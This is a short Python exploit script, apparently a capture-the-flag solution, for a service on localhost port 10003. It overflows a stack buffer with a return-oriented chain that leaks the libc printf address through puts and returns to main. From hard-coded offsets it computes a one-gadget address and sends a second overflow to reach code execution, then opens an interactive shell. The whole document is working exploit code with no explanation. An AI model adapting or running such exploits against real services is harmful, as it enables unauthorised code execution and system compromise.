import socket, time, struct, telnetlib

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 10003))

time.sleep(1)
print(s.recv(1000))
s.sendall(
  b'a'*0x28 +
  struct.pack('<Q', 0x4012d3) + # pop rdi
  struct.pack('<Q', 0x404020) + # printf
  struct.pack('<Q', 0x401030) + # puts
  struct.pack('<Q', 0x4011e1) + # main
  b'\n')

time.sleep(1)
d = s.recv(1000)
print(d)
printf = struct.unpack('<Q', d.split(b'\n')[1].ljust(8, b'\0'))[0]
print('printf: %x'%printf)

rce = (printf
  - 0x64e10   # printf
  + 0xe6af1)  # One-gadget RCE

s.sendall(
  b'a'*0x28 +
  struct.pack('<Q', rce) +
  b'\n')

t = telnetlib.Telnet()
t.sock = s
t.interact()
